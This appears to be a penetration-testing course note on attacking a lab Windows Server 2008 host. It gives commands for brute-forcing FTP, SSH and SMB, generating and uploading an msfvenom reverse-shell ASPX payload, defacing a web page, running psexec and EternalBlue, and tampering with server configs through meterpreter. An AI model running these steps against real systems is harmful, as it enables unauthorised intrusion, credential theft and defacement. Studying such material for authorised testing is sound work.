# 45 Windows Exploitation

# Windows Black Box Penetration Test

- A black box penetration test is a security assessment whereby the penetration tester is not provided with any information regarding the target system or network (No IP ranges, system information or default credentials are provided)
- The objective of a Black box penetration test is to accurately test the security of a system or network as an external unprivileged adversary
- This approach is very useful as it demonstrates how an external attacker with no inside knowledge would compromise a company's systems or networks

## Black Box Methodology

- Host discovery
- Port scanning & enumeration
- Vulnerability detection/scanning
- Exploitation
	- Manual
	- Automated
- Post Exploitation
	- Privilege Escalation
	- Persistence
	- Dumping Hashes

---

# Scenario & Scope

- You have just begun your first job as a Junior Penetration Tester and have been assigned to assist in performing a penetration test on a client's network
- The pentest lead has assigned you to gain access/exploit a host running Windows Server 2008
- Your primary objectives are:
	- Identify services running on the target
	- Identify vulnerabilities within the services
	- Exploit these vulnerabilities to obtain an initial foothold 

---

# Port Scanning & Enumeration

```shell
nmap -T4 -PA -sC -sV -p 1-10000 <ip> -oX <name> # Save in XML format (Metasploit)
	msf6: db_import <file-path> # Import XML in msf
	msf6: auxiliary(scanner/smb/smb_version) # Save the name of the computer trick
nc -nv <ip> <port> # Banner grabbing 
```


# Targeting Microsoft IIS FTP

```shell
nmap -sV -sC -p21,80 <ip>
# Also port 80 becouse Microsoft ftpd it's a package or part of Microsoft IIS
# They're both intertwined 
# FTP server is used to allow authenticated user to modify the Web server directory

# Use nmap script
la -ls /usr/share/nmap/scripts | grep ftp-
nmap -p21 --script=<name> 

# Try anonymous access
ftp <ip> <port> # Hit enter or try "anonymous" user

# Bruteforce
hydra -L <user-wordlist> -P <password-wordlist> <ip> ftp
[21][ftp] host: 10.2.27.73   login: vagrant   password: vagrant                              [21][ftp] host: 10.2.27.73   login: administrator   password: vagrant  

# Generate payload
msfvenom -p windows/shell/reverse_tcp LHOST=<ip> LPORT=1234 -f asp > shell.aspx

# Upload payload
Login into ftp vagrant:vagrant 
ftp: put shell.aspx

# Try execute the payload and setup listener
firefox: <ip>/shell.aspx
nc -nvlp <port>

# Deface webserver
ftp: get index.html # Download index file
nano index.html # Edit index file
ftp: put index.html # Upload edited index file
```


# Targeting OpenSSH

```shell
nmap -sV -sC -p22 <ip>
# Don't really matter what product or service (OpenSSH, LibSSH, etc)
# Important to consider the OS it is running on
# Utilize user account on the Windows or linux systems for authentication

searchsploit OpenSSH

hydra -l vagrant -P <password-wordlist> <ip> ssh # The user that i already found 
[22][ssh] host: 10.2.27.73   login: vagrant   password: vagrant

ssh vagrant@<ip> # Login into SSH
bash # If you want typical Windows CMD session
whoami /priv # See the privilege 

# Get meterpreter session
msf6: auxiliary(scanner/ssh/ssh_login)

# Can generate msfvenom payload and trasfer it over the target system via our SSH access
```


# Targeting SMB

```bash
nmap -sV -sC -p445 <ip>

# Bruteforce with already known users 
hydra -l administrator -P /usr/share/wordlists/metasploit/unix_users.txt <ip> smb
[445][smb] host: 10.2.27.84   login: administrator   password: vagrant
hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_users.txt <ip> smb
[445][smb] host: 10.2.27.84   login: vagrant   password: vagrant

# May can authenticate via RDP with those credentials

# Enum shares with credentials 
smbclient -L <ip> -U <user>
smbmap -u <user> -p <password> -H <ip>

# Enum user with credentials
enum4linux -u <user> -p <password> -U <ip>
msf6: auxialiary(scanner/smb/smb_enumusers)

# Authenticate via SMB with credentials (CMD)
locate psexec.py
cp <path>/psexec.py . # Copy in another dir
python3 psexec.py <user> <password> <ip>
# Alternative
msf6: exploit(scanner/smb/psexec)

# Windows Server 2008 and Windows Server 2008 R2 are vulnerable to EternalBlue
msf6: exploi(windows/smb/ms17_010_eternalblue)
```


# Targeting MySQL Database Server

```shell
nmap -sV -sC -p3306,8585 <ip>
searchsploit MySQL <version>

# Bruteforce
msf6: auxiliary(scanner/mysql/mysql_login)
# Can try with "root" default user 

# Login
mysql -u <user> -p <password> -h <ip>

# Exploit SMB to gain access and then edit phpmyadmin config file or other config file that may have credentials 
meterpreter: download phpmyadmin.conf
# Edit file
meterpreter: upload phpmyadmin.conf
# When edit config file need to restart apache
meterpreter: shell
shell: net stop wampapache
shell: net start wampapache
```